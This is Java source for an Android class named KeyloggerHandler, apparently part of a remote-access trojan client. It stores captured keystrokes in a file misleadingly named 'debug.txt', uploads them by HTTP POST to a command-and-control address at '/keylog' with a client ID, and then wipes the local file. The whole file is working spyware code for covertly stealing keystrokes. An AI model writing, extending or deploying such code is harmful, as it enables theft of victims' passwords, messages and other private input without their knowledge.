package com.ot.grhq.client.functionality;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.locks.ReentrantLock;

public class KeyloggerHandler {
    private static final KeyloggerHandler instance = new KeyloggerHandler();
    private final ReentrantLock lock = new ReentrantLock();
    private static final String keylogFile = "debug.txt";

    private KeyloggerHandler() {}
    public static KeyloggerHandler getInstance() {
        return instance;
    }

    public void writeFile(Context context, String data) {
        lock.lock();
        try {
            File file = new File(context.getFilesDir(), keylogFile);

            try {
                if (!file.exists())
                    file.createNewFile();

                FileWriter writer = new FileWriter(file, true);
                writer.write(data);
                writer.close();
            } catch (IOException e) {
                Log.e("eeee", e.toString());
            }
        } finally {
            lock.unlock();
        }
    }

    public void uploadFile(Context context) {
        lock.lock();
        try {
            new AsyncTask<Void, Void, Boolean>() {
                @Override
                protected Boolean doInBackground(Void... voids) {
                    StringBuilder stringBuilder = new StringBuilder();
                    File file = new File(context.getFilesDir(), keylogFile);
                    if (!file.exists()) {
                        try {
                            file.createNewFile();
                        } catch (IOException e) {
                        }
                    }

                    if (file.length() == 0)
                        return false;

                    try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                        String line;
                        while ((line = reader.readLine()) != null) {
                            stringBuilder.append(line).append("\n"); // Append each line followed by a newline character
                        }

                        HttpURLConnection connection = null;

                        // Create the URL and open a connection
                        URL url = new URL(Utils.getC2Address() + "/keylog");
                        connection = (HttpURLConnection) url.openConnection();
                        connection.setRequestMethod("POST");
                        connection.setConnectTimeout(15000); // 15 seconds timeout
                        connection.setReadTimeout(15000);    // 15 seconds timeout
                        connection.setDoOutput(true); // Allow sending data

                        // Set headers (optional)
                        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                        // Create the data you want to send in the POST request
                        String postData = "logs=" + stringBuilder.toString() + "&id=" + Utils.clientID(context) + "&timestamp=" + System.currentTimeMillis();

                        // Write the data to the output stream
                        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                        outputStream.writeBytes(postData);
                        outputStream.flush();
                        outputStream.close();

                        return connection.getResponseCode() == HttpURLConnection.HTTP_OK;

                    } catch (Exception e) {
                        Log.e("eeee", e.toString());
                    }
                    return null;
                }

                @Override
                protected void onPostExecute(Boolean result) {
                    super.onPostExecute(result);
                    if (!result)
                        return;

                    File file = new File(context.getFilesDir() , keylogFile);

                    try {
                        FileWriter writer = new FileWriter(file, false);
                        writer.write(""); // Writing an empty string clears the file
                        writer.close();
                    } catch (IOException e) {
                        Log.e("eeee", e.toString());
                    }
                }
            }.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR).get();
        } catch (ExecutionException e) {

        } catch (InterruptedException e) {

        } finally {
            lock.unlock();
        }
    }
}
